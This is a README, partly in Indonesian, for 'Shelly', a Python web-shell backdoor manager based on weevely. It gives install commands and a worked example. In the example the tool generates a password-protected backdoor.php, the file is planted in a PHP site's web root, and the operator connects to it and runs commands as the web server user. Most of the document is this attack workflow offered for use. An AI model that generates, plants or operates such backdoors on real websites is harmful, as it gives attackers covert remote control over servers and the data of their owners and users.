
## Shelly | Simple Backdoor Manager with Python (based on weevely)

![Screenshoot](/shelly.png)
<br>
Shelly adalah sebuah tool sederhana yang ditulis menggunakan Python, yang berfungsi untuk meremote sebuah website
<br>
### Instalation :

$ git clone https://github.com/tegal1337/Shelly <br>
$ cd Shelly <br>
$ python3 shell.py <br>

### Requirements :

<pre>
sudo pip install -r requirements.txt
</pre>

### Example :
<pre>

python3 shell.py -g backdoor -p tegal1337
   ______      ____
  / __/ / ___ / / __ __
 _\ \/ _ / -_/ / / // /
/___/_//_\__/_/_/\_, /
                /___/  v.1
--------------------------
Python shell - Tegal1337 |
Generate :
[+] ./backdoor.py -g "nama_shell" -p "password"
Connect Server :
[+] ./backdoor.py -u "url_shell" -p "password"

Backdoor berhasil dibuat dengan nama backdoor.php dan password tegal1337

dalpan@Tegal1337:~/Tools$ mv backdoor.php /opt/lampp/htdocs/php-futsal/
dalpan@Tegal1337:~/Tools$ python3 shell.py -u "http://localhost/php-futsal/backdoor.php" -p tegal1337
/opt/lampp/htdocs/php-futsal$ id
uid=1(daemon) gid=1(daemon) groups=1(daemon)
</pre>
![Screenshoot](/shelly2.png)
### Contact :
<ul>
  <li> Email : contact@dalpan.co</li>
  <li> FB : fb.com/dalpan.me
</ul>
